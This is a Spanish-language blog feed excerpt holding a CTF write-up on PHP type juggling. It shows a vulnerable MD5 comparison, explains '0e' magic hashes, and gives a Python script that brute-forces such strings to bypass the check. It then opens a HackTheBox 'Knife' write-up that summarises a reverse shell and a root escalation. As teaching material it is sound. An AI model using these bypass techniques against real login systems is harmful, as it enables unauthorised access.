&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/articles/typejuggling/juggling_RCTS2021web_juggling_descriptionChall.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 60%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Entramos al sitio web y obtenemos esto:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/articles/typejuggling/juggling_RCTS2021web_juggling_home.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Nos provee con el c√≥digo fuente de la web y adem√°s nos indica que debemos usar el par√°metro &lt;code&gt;hash&lt;/code&gt; para obtener la flag.&lt;/p&gt;

&lt;p&gt;El c√≥digo fuente es este:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;&amp;lt;!DOCTYPE HTML&amp;gt;
&amp;lt;?php
    if(isset($_GET['source'])) {
        highlight_file(__FILE__);
        die();
    } else {
        $value = &quot;240610708&quot;;
        if (isset($_GET['hash'])) {
            if ($_GET['hash'] === $value) {
                die('It is not THAT easy!');
            } 
            $hash = md5($_GET['hash']);
            $key = md5($value);
            if($hash == $key) {
                include('flag.php');
                print &quot;Congratulations! Your flag is: $flag&quot;;
            } else {
                print &quot;Flag not found!&quot;;
            }
        } 
    }
?&amp;gt;

&amp;lt;html&amp;gt;
  &amp;lt;head&amp;gt;
    &amp;lt;title&amp;gt;Challenge 1&amp;lt;/title&amp;gt;
  &amp;lt;/head&amp;gt;
  &amp;lt;body&amp;gt;
    &amp;lt;h2&amp;gt; Source code says it all&amp;lt;/h2&amp;gt;
    &amp;lt;p&amp;gt;Try to get the flag using the 'hash' parameter&amp;lt;/p&amp;gt;
    &amp;lt;a target=&quot;_blank&quot; href=&quot;?source&quot;&amp;gt;See the source code&amp;lt;/a&amp;gt;

  &amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Bien, veamos r√°pidamente que hace el programa‚Ä¶&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;code-analysis&quot;&gt;Review del fuente &lt;u&gt;PHP&lt;/u&gt; &lt;a href=&quot;#code-analysis&quot;&gt;üìå&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;El c√≥digo central en el que nos enfocaremos (y el importante) solo esta en esta parte:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;...
$value = &quot;240610708&quot;;
if (isset($_GET['hash'])) {
    if ($_GET['hash'] === $value) {
        die('It is not THAT easy!');
    } 
    $hash = md5($_GET['hash']);
    $key = md5($value);
    if($hash == $key) {
        include('flag.php');
...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Inicialmente vemos que si le pasamos al par√°metro &lt;code&gt;hash&lt;/code&gt; el valor &lt;code&gt;240610708&lt;/code&gt; nos saltar√≠a &lt;code&gt;It is not THAT easy!&lt;/code&gt;‚Ä¶ Esto ya que v√°lida si el valor y el &lt;strong&gt;tipo de variable (int, float, string‚Ä¶)&lt;/strong&gt; son iguales.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.php.net/manual/es/language.operators.comparison.php&quot;&gt;Operadores de comparaci√≥n en &lt;strong&gt;PHP&lt;/strong&gt;&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/articles/typejuggling/juggling_google_operatorsComparision.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;En caso de no ser iguales y no ver el error, toma el valor del par√°metro y el de la variable &lt;code&gt;$value&lt;/code&gt; y genera un &lt;strong&gt;hash MD5&lt;/strong&gt; (&lt;strong&gt;&lt;em&gt;Message-Digest Algorithm 5&lt;/em&gt;&lt;/strong&gt;) para cada uno, que ese tipo de &lt;strong&gt;hash&lt;/strong&gt; es muy usado para comprobar si un archivo ha sido modificado en alguna transmisi√≥n o proceso.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://es.wikipedia.org/wiki/MD5&quot;&gt;Wikipedia - MD5&lt;/a&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://tecnonautas.net/que-es-la-funcion-hash-del-md5-y-es-segura/&quot;&gt;¬øQu√© es la funci√≥n Hash del MD5 y es segura?&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Y como paso final para obtener la flag, v√°lida que los hashes resultantes sean iguales, peeeeeeeeeeero solo su valor, no su tipo.&lt;/p&gt;

&lt;p&gt;ü§æüèø &lt;strong&gt;AC√Å&lt;/strong&gt; es cuando empezamos a jugar‚Ä¶&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;testing-chall&quot;&gt;Hacemos algunos testeos &lt;a href=&quot;#testing-chall&quot;&gt;üìå&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Para entender que hace el c√≥digo muuuucho mejor, creamos este con el que jugaremos toooodo el art√≠culo.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;&amp;lt;?php
    $value = &quot;240610708&quot;;
    $hash_get = &quot;&amp;lt;vamos_a_jugar_con_esta_variable&amp;gt;&quot;;

    if ($hash_get === $value) {
        echo &quot;It is not THAT easy!\n&quot;;
        exit(1);
    }

    $hash = md5($hash_get);
    $key = md5($value);

    echo &quot;Value: &quot; . $value . &quot; - Hash: &quot; . $key . &quot;\n&quot;;
    echo &quot;Hash_GET: &quot; . $hash_get . &quot; - Key: &quot; . $hash . &quot;\n&quot;;

    if ($key == $hash) {
        echo &quot;\n[+] Iguales... 3st4{es_l4_fLA6}\n&quot;;
    } 
    else {
        echo &quot;\n[-] No son iguales...\n&quot;;
    }
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Podemos pensar en enviar el valor &lt;code&gt;240610708&lt;/code&gt; en el par√°metro, peeero como hay una comprobaci√≥n entre esas dos variables antes de las del hash, vamos a entrar al &lt;code&gt;exit(1)&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;http://challenges.defsoc.tk:8080?hash=240610708
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;$value = &quot;240610708&quot;;
$hash_get = &quot;240610708&quot;;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/articles/typejuggling/juggling_testPHP_exit1.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As√≠ que F.&lt;/p&gt;

&lt;p&gt;Tambi√©n podr√≠amos pensar en enviar el valor &lt;strong&gt;MD5&lt;/strong&gt; de &lt;code&gt;240610708&lt;/code&gt;, claramente pasar√≠amos el primer &lt;code&gt;if&lt;/code&gt;, pero ¬øobtendr√≠amos la flag? (¬øqu√© dices t√∫ antes de ver la respuesta?)&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± echo -n &quot;240610708&quot; | md5sum
0e462097431906509019562988736854
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;http://challenges.defsoc.tk:8080?hash=0e462097431906509019562988736854
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;$value = &quot;240610708&quot;;
$hash_get = &quot;0e462097431906509019562988736854&quot;;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/articles/typejuggling/juggling_testPHP_sendHASHofVALUE_notSAME.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Exacto, no son iguales, ya que esta generando un hash nuevo con el valor &lt;code&gt;0e462097431906509019562988736854&lt;/code&gt;, as√≠ que tampoco es por ac√°‚Ä¶&lt;/p&gt;

&lt;p&gt;Volviendo a la descripci√≥n del reto nos habla de -‚Äúalg√∫n tipo de &lt;strong&gt;juggling&lt;/strong&gt;‚Äù- ¬økhe?&lt;/p&gt;

&lt;p&gt;Investiguemos.&lt;/p&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;h1 id=&quot;juggling&quot;&gt;Empezamos a jugar con el &lt;u&gt;Type Juggling&lt;/u&gt; &lt;a href=&quot;#juggling&quot;&gt;#&lt;/a&gt;&lt;/h1&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;h2 id=&quot;overview-juggling&quot;&gt;Hablamos un poquito de &lt;u&gt;Type Juggling&lt;/u&gt; &lt;a href=&quot;#overview-juggling&quot;&gt;üìå&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Buscando &lt;code&gt;juggling php&lt;/code&gt; llegamos a esta brutal descripci√≥n del propio manual de &lt;strong&gt;PHP&lt;/strong&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/articles/typejuggling/juggling_google_ManualPHPdescriptionJuggling.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Perfecto, el primer p√°rrafo ya nos explica que es eso del ‚Äú&lt;strong&gt;juggling&lt;/strong&gt;‚Äù (&lt;strong&gt;type juggling&lt;/strong&gt;), b√°sicamente es el juego entre tipos de variables, donde podemos definir una que sea tipo &lt;code&gt;int&lt;/code&gt; (&lt;code&gt;$hola=1;&lt;/code&gt;) pero despu√©s darle otro valor que cambie su tipo, por ejemplo &lt;code&gt;string&lt;/code&gt; (&lt;code&gt;$hola=&quot;1&quot;;&lt;/code&gt;) sin tener problemas.&lt;/p&gt;

&lt;p&gt;Esto es interesante, porque si validamos los dos resultados, ¬øser√≠an iguales? üòÆ Claramente no, ¬øcierto? Una es un entero y la otra es una string‚Ä¶ Validemos:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;&amp;lt;?php
    $holaINT = 1;
    $holaSTRING = &quot;1&quot;;

    if ($holaINT == $holaSTRING) {
        echo &quot;Son iguales :o\n&quot;;
    }
    else {
        echo &quot;No son iguales :)\n&quot;;
    }
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/articles/typejuggling/juggling_testPHP_validationINTwithSTRING.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;WTF, ¬økheeeeeeeeeeee? (antes ya expliqu√© la raz√≥n, pero ¬øla recuerdas?).&lt;/p&gt;

&lt;p&gt;Apoyado en varios recursos vamos a entender que pasa ac√° y como aprovecharnos de ello‚Ä¶&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09&quot;&gt;PHP Type Juggling Vulnerabilities&lt;/a&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Type%20Juggling/README.md&quot;&gt;PHP Juggling type and magic hashes&lt;/a&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.hackplayers.com/2018/03/hashes-magicos-en-php-type-jugling.html&quot;&gt;Hashes ‚Äúm√°gicos‚Äù en PHP (type jugling)&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Todo viene de la comparaci√≥n pobre que se hace al usar &lt;code&gt;== o !=&lt;/code&gt;, que estar√≠a diciendo: ‚Äúv√°lida si las dos variables tienen el mismo valor‚Äù, pero esta comparaci√≥n no es estricta, por lo que no v√°lida si las dos tienen el mismo tipo de variable, en este caso si &lt;code&gt;int == string&lt;/code&gt;, esto no lo hace, por eso nos muestra que son iguales üôÉ&lt;/p&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;p&gt;Este comportamiento puede parecer a primera vista simplemente molesto, pero noooooooo, es causante de muuuuuuchos problemas y huecos en la seguridad‚Ä¶&lt;/p&gt;

&lt;p&gt;El &lt;strong&gt;peligro&lt;/strong&gt; puede llegar cuando aunque sea una de las variables que est√°n siendo comparadas, &lt;strong&gt;es manipulada por el usuario&lt;/strong&gt;. Y que en el peor de los casos ese usuario tenga pensamientos de atacante üòà&lt;/p&gt;

&lt;p&gt;En nuestro caso tenemos un simple redirect hacia &lt;code&gt;flag.php&lt;/code&gt; si logramos jugar correctamente con el &lt;strong&gt;Type Juggling&lt;/strong&gt;, pero en el mundo real estos problemas se ven un mont√≥n en los &lt;code&gt;panel login&lt;/code&gt;.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Type%20Juggling/README.md#example-vulnerable-code&quot;&gt;Ac√° un ejemplo de un c√≥digo vulnerable que maneja &lt;strong&gt;cookies&lt;/strong&gt;&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Bueno, ya vimos que &lt;code&gt;1==&quot;1&quot;&lt;/code&gt;, ¬øpero qu√© pasa si validamos &lt;code&gt;1==&quot;1 y m√°s texto ac√°&quot;&lt;/code&gt;?&lt;/p&gt;

&lt;p&gt;Claramente no son iguales‚Ä¶&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;&amp;lt;?php
    $holaINT = 1;
    $holaSTRING = &quot;1 y m√°s texto ac√°&quot;;

    if ($holaINT == $holaSTRING) {
        echo &quot;Son iguales :o\n&quot;;
    }
    else {
        echo &quot;No son iguales :)\n&quot;;
    }
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ejecutamos:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± php test.php 
Son iguales :o
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Jmmmmmmm, QUEEEEEEEEEEEEEE!!&lt;/p&gt;

&lt;p&gt;Lo que hace &lt;strong&gt;PHP&lt;/strong&gt; ac√° es que como el primer car√°cter de la cadena es el n√∫mero de la otra variable (&lt;code&gt;1&lt;/code&gt;), &lt;strong&gt;lo extrae&lt;/strong&gt; y los dem√°s caracteres no le interesan, simplemente asimila que estamos comparando &lt;code&gt;1==&quot;1&quot;&lt;/code&gt;, o sea la misma prueba que hicimos antes‚Ä¶&lt;/p&gt;

&lt;p&gt;Obviamente si cambiamos la cadena a algo como:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;1==&quot;a y m√°s 1 texto ac√°&quot; --&amp;gt; No son iguales
1==&quot;2 y m√°s texto ac√°&quot;   --&amp;gt; No son iguales
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Pues perfecto, ya entendimos como funciona un &lt;strong&gt;Type Juggling&lt;/strong&gt;, veamos como obtener la flag jugando con √©l.&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;exploit-juggling&quot;&gt;Explotamos el &lt;u&gt;Type Juggling&lt;/u&gt; para conseguir la &lt;u&gt;flag&lt;/u&gt; &lt;a href=&quot;#exploit-juggling&quot;&gt;üìå&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Algo que entendimos es que podemos generar el bypass simplemente consiguiendo que las dos variables sean del mismo tipo m√°s no con el mismo valor.&lt;/p&gt;

&lt;p&gt;El &lt;strong&gt;hash&lt;/strong&gt; con el que esta comparando nuestro input (&lt;code&gt;$_GET['hash']&lt;/code&gt;) es este:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;0e462097431906509019562988736854
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Que si usamos &lt;strong&gt;PHP&lt;/strong&gt; para ver su tipo, nos mostrara que es una &lt;code&gt;string&lt;/code&gt;, peeeeeeeeeero si &lt;strong&gt;PHP&lt;/strong&gt; encuentra que el hash empieza con &lt;code&gt;0e&lt;/code&gt; y el resto de su contenido es num√©rico, lo tratara como si su tipo de variable fuera &lt;code&gt;float&lt;/code&gt; y no una &lt;code&gt;string&lt;/code&gt; üò∂&lt;/p&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;p&gt;Con esto en mente, sabemos que tenemos que encontrar un valor que al obtener su &lt;strong&gt;hash MD5&lt;/strong&gt;, primero empiece con &lt;code&gt;0e&lt;/code&gt; y segundo que su contenido sean solo n√∫meros‚Ä¶ As√≠, solo as√≠, har√≠amos que la validaci√≥n de:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;&amp;lt;?php
    $value = &quot;240610708&quot;;
    $hash_get = &quot;&amp;lt;este_valor&amp;gt;&quot;;

    // md5($value) --&amp;gt; 0e462097431906509019562988736854 --&amp;gt; float
    // md5($hash_get) --&amp;gt; buscamos este valor numerico para que sea --&amp;gt; float

    // Y as√≠ compare (float==float) y logremos ver la flag
    if ($key == $hash) {
        echo &quot;[+] Iguales... 3st4{es_l4_fLA6}\n&quot;;
    } 
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Uff algo dif√≠cil, ¬øno?&lt;/p&gt;

&lt;p&gt;En internet encontramos much√≠simos valores con los que podr√≠amos probar:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/spaze/hashes/blob/master/md5.md&quot;&gt;Ac√° hay una graaaaaaaan lista de hashes &lt;strong&gt;MD5&lt;/strong&gt; flotantes&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Si tomamos alguno, por ejemplo: &lt;code&gt;NOOPCJF&lt;/code&gt; y lo probamos en nuestro &lt;code&gt;test.php&lt;/code&gt;, generamos el bypass:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/articles/typejuggling/juggling_testPHP_bypasswith_NOOPCFJ_WEB.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Ya podr√≠amos probar en la web y tambi√©n obtendr√≠amos la flag, solo que ser√≠a la del reto.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Pero ta feo simplemente copiar y pegar, intentemos buscar una cadena nosotros mismos‚Ä¶&lt;/p&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;h1 id=&quot;py-juggling&quot;&gt;Jugamos con &lt;u&gt;Python&lt;/u&gt; para encontrar hash tipo &lt;u&gt;float&lt;/u&gt; &lt;a href=&quot;#py-juggling&quot;&gt;#&lt;/a&gt;&lt;/h1&gt;

&lt;p&gt;Eso s√≠, debemos tener paciencia, ya que tenemos que generar dos cosas importantes:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Un hash que inicie con &lt;code&gt;0e&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;Que el contenido despu√©s del &lt;code&gt;0e&lt;/code&gt; sea √∫nicamente n√∫meros.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Juguemos con cadenas &lt;strong&gt;random&lt;/strong&gt;, as√≠ mismo ser√° la posibilidad de obtener r√°pido alg√∫n hash con los criterios necesarios‚Ä¶&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-py&quot;&gt;#!/usr/bin/python3

import hashlib
import string
import random
import signal

# Funciones ---------------------------.
def def_handler(signal, frame):  # Controlamos salida con Ctrl+C
    print()
    exit()

signal.signal(signal.SIGINT, def_handler)

# Inicio del programa -----------------.
dic = string.ascii_letters + string.digits  # abc...xyzABC...XYZ0123456789
rand_index = list(range(7, 15))  # Generamos array: [7, 8 ... 13, 14]

while True:
    # Elegimos un numero aleatorio de nuestro array (entre 7 y 14), ese numero ser√° el tama√±o de la cadena.
    # Y la cadena se construye con caracteres aleatorios del diccionario.
    random_value = ''.join(random.choices(dic, k=random.choice(rand_index)))
    # Generamos hash MD5 correspondiente al valor random.
    hash_random_value = hashlib.md5(random_value.encode('utf-8')).hexdigest()

    # Si el hash empieza con 0e, jugamos...
    if hash_random_value.startswith(&quot;0e&quot;):
        # Extraemos todo lo que esta despues del 0e y validamos si su contenido es numerico.
        if hash_random_value[2:].isnumeric():
            # Si es numerico, tenemos el hash del texto que PHP interpreta como flotante.
            print(f&quot;[+] Texto: {random_value} - Hash: {hash_random_value}&quot;)
            break
&lt;/code&gt;&lt;/pre&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;a href=&quot;https://github.com/lanzt/blog/blob/main/assets/scripts/articles/typejuggling/jugl.py&quot;&gt;jugl.py&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Si lo ejecutamos (lo dicho, d√°ndole tiempo) llegamos a obtener una cadena:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/articles/typejuggling/juggling_juglPY_foundPOSSIBLEtext2bypass.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Y si hacemos las respectivas prueeeebaas:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;$value = &quot;240610708&quot;;¬∑
$hash_get = &quot;TP4KzMGZ&quot;;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/articles/typejuggling/juggling_testPHP_bypassWITHstringOFpy.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Opa, es v√°lidooooooooooo, si lo probamos ahora contra el sitio real:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/articles/typejuggling/juggling_RCTS2021web_bypassWITHscriptOFpy_flag.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Y listoos, hemos bypasseado la validaci√≥n de hashes aprovechando la pobre comparaci√≥n que &lt;code&gt;PHP&lt;/code&gt; hace al usar &lt;code&gt;==&lt;/code&gt; y no &lt;code&gt;===&lt;/code&gt;. Esto para hacer un match en cuanto a los tipos de variables aunque el contenido de ellas sea distinto.&lt;/p&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;h1 id=&quot;refs&quot;&gt;Referencias &lt;a href=&quot;#refs&quot;&gt;#&lt;/a&gt;&lt;/h1&gt;

&lt;hr /&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.whitehatsec.com/blog/magic-hashes/&quot;&gt;Magic Hashes&lt;/a&gt;, whitehatsec.&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09&quot;&gt;PHP Type Juggling Vulnerabilities&lt;/a&gt;, medium/swlh.&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Type%20Juggling/README.md&quot;&gt;PHP Juggling type and magic hashes&lt;/a&gt;, github/PayloadAllTheThings.&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf&quot;&gt;PDF - PHP Magic Tricks: Type Juggling&lt;/a&gt;, owasp.&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.hackplayers.com/2018/03/hashes-magicos-en-php-type-jugling.html&quot;&gt;Hashes ‚Äúm√°gicos‚Äù en PHP (type jugling)&lt;/a&gt;, hackplayers.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;p&gt;Como dije al inicio, esta vulnerabilidad puede verse ‚Äúpeque√±a‚Äù en estos entornos de -ver flags-, pero las pobres comparaciones (&lt;code&gt;==&lt;/code&gt; o &lt;code&gt;!=&lt;/code&gt;) se ven mucho en &lt;code&gt;logins&lt;/code&gt;, ah√≠ es donde reside el verdadero terror de esto, ya que podemos bypassear a lo loco.&lt;/p&gt;

&lt;p&gt;Espero que haya sido de utilidad este post y como siempre digo, a seguir rompiendo de todoooooooooooooo (pero con cuidadito y con respeto).&lt;/p&gt;
</description>
        <pubDate>Sun, 29 Aug 2021 00:00:00 -0700</pubDate>
        <link>http://localhost:4000/article/type-juggling</link>
        <guid isPermaLink="true">http://localhost:4000/article/type-juggling</guid>
        
        <category>type-juggling</category>
        
        <category>PHP</category>
        
        
        <category>article</category>
        
      </item>
    
      <item>
        <title>HackTheBox - Knife</title>
        <description>&lt;p&gt;M√°quina Linux nivel f√°cil, explotaremos &lt;strong&gt;PHP&lt;/strong&gt; y jugaremos con la herramienta &lt;strong&gt;knife&lt;/strong&gt; para ejecutar c√≥digo &lt;strong&gt;Ruby&lt;/strong&gt; como el usuario &lt;strong&gt;root&lt;/strong&gt; (mediante &lt;strong&gt;sudo&lt;/strong&gt;).&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/knife/347knifeHTB.png&quot; alt=&quot;347knifeHTB&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;tldr-spanish-writeup&quot;&gt;TL;DR (Spanish writeup)&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;Creada por&lt;/strong&gt;: &lt;a href=&quot;https://www.hackthebox.eu/profile/98767&quot;&gt;MrKN16H&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Las locuras de nuestra existencia e.e&lt;/p&gt;

&lt;p&gt;Hohoholaaa, en esta m√°quina nos encontraremos un servidor web con una versi√≥n &lt;code&gt;PHP&lt;/code&gt; vulnerable a ejecuci√≥n remota de comandos, la usaremos para obtener una &lt;strong&gt;Reverse Shell&lt;/strong&gt; como el usuario &lt;code&gt;james&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Enumerando los permisos que tenemos como otros usuarios (&lt;code&gt;sudo&lt;/code&gt;), veremos que podemos ejecutar un binario llamado &lt;code&gt;knife&lt;/code&gt;, buscando en internet formas de escalar privilegios usandolo, llegaremos a encontrar el subcomando &lt;code&gt;exec&lt;/code&gt;, con √©l podremos ejecutar scripts o comandos &lt;code&gt;Ruby&lt;/code&gt;, lo usaremos para establecer una &lt;strong&gt;Shell&lt;/strong&gt; como el usuario &lt;code&gt;root&lt;/code&gt; en el sistema.&lt;/p&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;h3 id=&quot;clasificaci√≥n-de-la-m√°quina-seg√∫n-la-gentesita&quot;&gt;Clasificaci√≥n de la m√°quina seg√∫n la gentesita&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/knife/347statistics.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 80%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Bastante juguetona, un poquito de movimientos con las manos (: y alguna que otra vuln conocida.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Escribo para tener mis ‚Äúnotas‚Äù, por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) adem√°s de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva m√°s de ense√±anza que de solo plasmar lo que hice.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;p&gt;Moving fast‚Ä¶&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;a href=&quot;#reconocimiento&quot;&gt;Reconocimiento&lt;/a&gt;.
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#enum-nmap&quot;&gt;Escaneo de puertos mediante &lt;strong&gt;nmap&lt;/strong&gt;&lt;/a&gt;.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#enumeracion&quot;&gt;Enumeraci√≥n&lt;/a&gt;.
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#puerto-80&quot;&gt;Vemos que hay en el puerto 80&lt;/a&gt;.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#explotacion&quot;&gt;Explotaci√≥n&lt;/a&gt;.
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#expl-revsh-james&quot;&gt;Jugamos con la vulnerabilidad de &lt;strong&gt;PHP&lt;/strong&gt; para conseguir &lt;strong&gt;RCE&lt;/strong&gt;&lt;/a&gt;.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#escalada-de-privilegios&quot;&gt;Escalada de privilegios&lt;/a&gt;.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;h1 id=&quot;reconocimiento&quot;&gt;Reconocimiento &lt;a href=&quot;#reconocimiento&quot;&gt;#&lt;/a&gt;&lt;/h1&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

